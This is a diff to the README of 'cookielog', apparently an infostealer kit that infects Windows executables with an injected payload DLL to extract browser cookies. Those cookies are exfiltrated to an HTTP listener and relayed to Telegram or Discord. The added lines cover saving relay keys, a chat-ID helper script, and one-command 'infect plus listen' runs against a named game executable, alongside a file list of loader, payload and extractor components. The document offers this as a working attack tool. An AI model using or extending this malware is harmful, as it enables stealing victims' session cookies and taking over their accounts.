@@ -73,31 +73,46 @@ summary to Telegram/Discord over HTTPS (which passes most firewalls).
 Both relays are **optional** — if no `--telegram` or `--discord` flag is passed,
 the listener just saves cookies to `loot/` as usual.
 
+**Keys are saved automatically** — the first time you pass `--telegram` or `--discord`,
+the value is stored in `config.json`. On subsequent runs, just run `python auto.py`
+without the flag and the saved key is loaded automatically.
+
+```bat
+python auto.py --config             :: show saved keys (masked)
+python auto.py --clear-telegram     :: remove saved Telegram token
+python auto.py --clear-discord      :: remove saved Discord webhook
+```
+
 ### Telegram setup
 
 1. **Create a bot** (takes 30 seconds):
    - Open Telegram, search for **@BotFather**
    - Send `/newbot`
    - Pick a name and username (e.g. `mycookielog_bot`)
-   - BotFather replies with an **API token** like `7123456789:AAH...long_string...`
+   - BotFather replies with an **API token** like `8975447629:AAFzK9wam_2jfoZ...`
 
 2. **Get your chat ID** (so the bot knows who to message):
    - Send any message to your new bot (e.g. "hi")
-   - Open this URL in a browser (replace `<TOKEN>` with your bot token):
+   - Run the helper script (it queries the API and saves to config automatically):
+     ```bat
+     python tg_chatid.py 8975447629:AAFzK9wam_2jfoZ...
      ```
-     https://api.telegram.org/bot<TOKEN>/getUpdates
-     ```
-   - Look for `"chat":{"id": 987654321` in the JSON — that number is your chat ID
+   - It prints your chat ID and the full `--telegram` string, and saves to `config.json`
 
 3. **Run the listener with relay**:
    ```bat
-   python listen.py 9090 --telegram 7123456789:AAH...long_string...:987654321
+   python listen.py 9090 --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
    ```
    Format: `--telegram <bot_token>:<chat_id>`
 
    Or via `auto.py` (starts listener + infects in one command):
    ```bat
-   python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...long_string...:987654321
+   python auto.py "GET UPSTAIRS (64bit)" --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
+   ```
+
+   After the first run, the key is saved — next time just:
+   ```bat
+   python auto.py "GET UPSTAIRS (64bit)"
    ```
 
 4. **What you receive**: when the victim runs the infected exe, you get a Telegram
@@ -287,6 +302,7 @@ cookielog/
 ├── auto.bat              # Shortcut: python auto.py %*
 ├── pick.py               # GUI infector (standalone, manual C2 config)
 ├── listen.py             # HTTP listener: receives exfiltrated cookies
+├── tg_chatid.py          # Helper: finds Telegram chat ID from bot token
 ├── sink.py               # Named pipe server (local fallback, no C2 needed)
 ├── swap.py               # Splits cookies by site (per-site cookies.txt)
 ├── cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
@@ -297,6 +313,7 @@ cookielog/
 ├── PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
 ├── PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
 ├── requirements.txt      # Python deps
+├── config.json           # Saved API keys (auto-generated, gitignored)
 ├── .gitignore
 ├── src/
 │   ├── ckdll.cpp         # Payload DLL (CRT-less, injectable)
@@ -734,6 +751,7 @@ are skipped.
 |---|---|
 | `install.bat` | One-click dependency installer (Python, MSVC, CLI tools, build, cmd_init) |
 | `auto.bat` | Shortcut: `python auto.py %*` |
+| `tg_chatid.py` | Finds Telegram chat ID from bot token, saves to `config.json` |
 | `start_attack.bat` | Launches `listen.py` (port 9090) + `pick.py` GUI together |
 | `test_curl.bat` | POSTs a fake cookie to the listener via `curl` to verify it works |
 | `build.bat` | Compiles `ckdll.dll` + `loader.exe` (generates `payload.h`) |
